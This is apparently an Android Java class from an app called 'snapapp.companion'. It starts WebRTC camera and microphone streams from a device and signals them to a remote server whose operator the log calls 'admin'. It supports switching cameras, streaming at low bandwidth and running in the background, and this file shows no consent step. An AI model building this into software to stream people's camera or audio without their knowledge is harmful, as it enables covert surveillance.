package com.snapapp.companion;

import android.content.Context;
import android.util.Log;
import org.json.JSONObject;
import org.webrtc.*;
import java.util.ArrayList;
import java.util.List;

public class WebRtcStreamManager {
    private static final String TAG = "WebRtcStream";
    private static WebRtcStreamManager instance;
    private PeerConnectionFactory factory;
    private PeerConnection peerConnection;
    private VideoCapturer videoCapturer;
    private VideoTrack localVideoTrack;
    private AudioTrack localAudioTrack;
    private EglBase eglBase;
    private boolean isFrontCamera = true;
    private String activeServerUrl;
    private String activeDeviceId;

    private WebRtcStreamManager() {}

    public static synchronized WebRtcStreamManager getInstance() {
        if (instance == null) instance = new WebRtcStreamManager();
        return instance;
    }

    public synchronized void startLiveStream(final Context ctx, final String serverUrl, final String deviceId,
                                            final boolean front, final boolean video, final boolean audio) {
        stopLiveStream();
        this.activeServerUrl = serverUrl;
        this.activeDeviceId = deviceId;
        this.isFrontCamera = front;

        try {
            PeerConnectionFactory.initialize(PeerConnectionFactory.InitializationOptions.builder(ctx).createInitializationOptions());

            try {
                eglBase = EglBase.create();
            } catch (Exception e) {
                Log.e(TAG, "Failed to create EglBase (likely background GPU context lost): " + e.getMessage());
                eglBase = null;
            }

            PeerConnectionFactory.Options options = new PeerConnectionFactory.Options();
            PeerConnectionFactory.Builder builder = PeerConnectionFactory.builder()
                    .setOptions(options);
                    
            if (eglBase != null) {
                builder.setVideoEncoderFactory(new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), true, true))
                       .setVideoDecoderFactory(new DefaultVideoDecoderFactory(eglBase.getEglBaseContext()));
            }
            
            factory = builder.createPeerConnectionFactory();

            List<PeerConnection.IceServer> iceServers = new ArrayList<>();
            iceServers.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
            iceServers.add(PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer());
            iceServers.add(PeerConnection.IceServer.builder("stun:stun.cloudflare.com:3478").createIceServer());

            PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(iceServers);
            config.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;

            peerConnection = factory.createPeerConnection(config, new PeerConnection.Observer() {
                @Override public void onSignalingChange(PeerConnection.SignalingState s) {
                    Log.d(TAG, "Signaling: " + s);
                }
                @Override public void onIceConnectionChange(PeerConnection.IceConnectionState s) {
                    Log.d(TAG, "ICE: " + s);
                }
                @Override public void onIceConnectionReceivingChange(boolean b) {}
                @Override public void onIceGatheringChange(PeerConnection.IceGatheringState s) {
                    Log.d(TAG, "ICE Gathering: " + s);
                }
                @Override public void onIceCandidate(IceCandidate ic) { sendSignal("candidate", null, ic); }
                @Override public void onIceCandidatesRemoved(IceCandidate[] ics) {}
                @Override public void onAddStream(MediaStream ms) {}
                @Override public void onRemoveStream(MediaStream ms) {}
                @Override public void onDataChannel(DataChannel dc) {}
                @Override public void onRenegotiationNeeded() {}
            });

            if (audio) {
                MediaConstraints ac = new MediaConstraints();
                ac.mandatory.add(new MediaConstraints.KeyValuePair("googEchoCancellation", "true"));
                ac.mandatory.add(new MediaConstraints.KeyValuePair("googAutoGainControl", "true"));
                ac.mandatory.add(new MediaConstraints.KeyValuePair("googNoiseSuppression", "true"));
                ac.mandatory.add(new MediaConstraints.KeyValuePair("googHighpassFilter", "true"));
                AudioSource as = factory.createAudioSource(ac);
                localAudioTrack = factory.createAudioTrack("ARDAMSa0", as);
                peerConnection.addTrack(localAudioTrack);
            }

            if (video) {
                videoCapturer = createCameraCapturer(ctx, front);
                if (videoCapturer != null) {
                    SurfaceTextureHelper sth = null;
                    if (eglBase != null) {
                        sth = SurfaceTextureHelper.create("CaptureThread", eglBase.getEglBaseContext());
                    } else {
                        sth = SurfaceTextureHelper.create("CaptureThread", null); // Fallback to software/basic surface
                    }
                    VideoSource vs = factory.createVideoSource(videoCapturer.isScreencast());
                    videoCapturer.initialize(sth, ctx, vs.getCapturerObserver());
                    videoCapturer.startCapture(320, 240, 10); // 240p @ 10fps for 2G
                    localVideoTrack = factory.createVideoTrack("ARDAMSv0", vs);
                    peerConnection.addTrack(localVideoTrack);
                }
            }

            Log.d(TAG, "Live stream started: video=" + video + " audio=" + audio + " front=" + front);
        } catch (Exception e) {
            Log.e(TAG, "startLiveStream error", e);
            stopLiveStream();
        }
    }

    public synchronized void switchCamera() {
        if (videoCapturer instanceof CameraVideoCapturer) {
            CameraVideoCapturer cvc = (CameraVideoCapturer) videoCapturer;
            isFrontCamera = !isFrontCamera;
            cvc.switchCamera(null);
        }
    }

    public synchronized void handleRemoteOffer(String sdpDescription) {
        if (peerConnection == null) return;
        SessionDescription offer = new SessionDescription(SessionDescription.Type.OFFER, sdpDescription);
        peerConnection.setRemoteDescription(new SimpleSdpObserver() {
            @Override
            public void onSetSuccess() {
                peerConnection.createAnswer(new SimpleSdpObserver() {
                    @Override
                    public void onCreateSuccess(SessionDescription answer) {
                        String sdp = answer.description;
                        if (sdp.contains("useinbandfec=1")) {
                            sdp = sdp.replace("useinbandfec=1", "useinbandfec=1;maxaveragebitrate=16000;stereo=0");
                        }
                        SessionDescription custom = new SessionDescription(answer.type, sdp);
                        peerConnection.setLocalDescription(new SimpleSdpObserver(), custom);
                        sendSignal("answer", sdp, null);
                        Log.d(TAG, "Sent SDP answer to admin");
                    }
                }, new MediaConstraints());
            }
            @Override
            public void onSetFailure(String s) {
                Log.e(TAG, "setRemoteDescription failed: " + s);
            }
        }, offer);
    }

    public synchronized void handleRemoteCandidate(String sdp, int sdpMLineIndex, String sdpMid) {
        if (peerConnection != null) {
            peerConnection.addIceCandidate(new IceCandidate(sdpMid, sdpMLineIndex, sdp));
        }
    }

    private void sendSignal(String type, String sdp, IceCandidate candidate) {
        if (activeServerUrl == null || activeDeviceId == null) return;
        try {
            JSONObject body = new JSONObject();
            body.put("type", type);
            body.put("sender", "device");
            if (sdp != null) body.put("sdp", sdp);
            if (candidate != null) {
                JSONObject cand = new JSONObject();
                cand.put("candidate", candidate.sdp);
                cand.put("sdpMLineIndex", candidate.sdpMLineIndex);
                cand.put("sdpMid", candidate.sdpMid);
                body.put("candidate", cand);
            }
            ApiClient.postJson(activeServerUrl + "/api/devices/" + activeDeviceId + "/signaling", body, null);
        } catch (Exception e) {
            Log.e(TAG, "sendSignal error", e);
        }
    }

    private VideoCapturer createCameraCapturer(Context ctx, boolean front) {
        CameraEnumerator enumerator;
        try {
            enumerator = Camera2Enumerator.isSupported(ctx) ? new Camera2Enumerator(ctx) : new Camera1Enumerator(true);
        } catch (Throwable t) {
            enumerator = new Camera1Enumerator(true);
        }
        final String[] names = enumerator.getDeviceNames();
        if (names == null || names.length == 0) return null;
        for (String name : names) {
            if (front && enumerator.isFrontFacing(name)) return enumerator.createCapturer(name, null);
            else if (!front && enumerator.isBackFacing(name)) return enumerator.createCapturer(name, null);
        }
        return enumerator.createCapturer(names[0], null);
    }

    public synchronized void stopLiveStream() {
        try {
            if (videoCapturer != null) { videoCapturer.stopCapture(); videoCapturer.dispose(); videoCapturer = null; }
            if (peerConnection != null) { peerConnection.close(); peerConnection = null; }
            if (factory != null) { factory.dispose(); factory = null; }
            if (eglBase != null) { eglBase.release(); eglBase = null; }
        } catch (Exception e) {
            Log.e(TAG, "stopLiveStream error", e);
        }
    }

    private static class SimpleSdpObserver implements SdpObserver {
        @Override public void onCreateSuccess(SessionDescription s) {}
        @Override public void onSetSuccess() {}
        @Override public void onCreateFailure(String s) { Log.e("WebRtcStream", "SDP create fail: " + s); }
        @Override public void onSetFailure(String s) { Log.e("WebRtcStream", "SDP set fail: " + s); }
    }
}
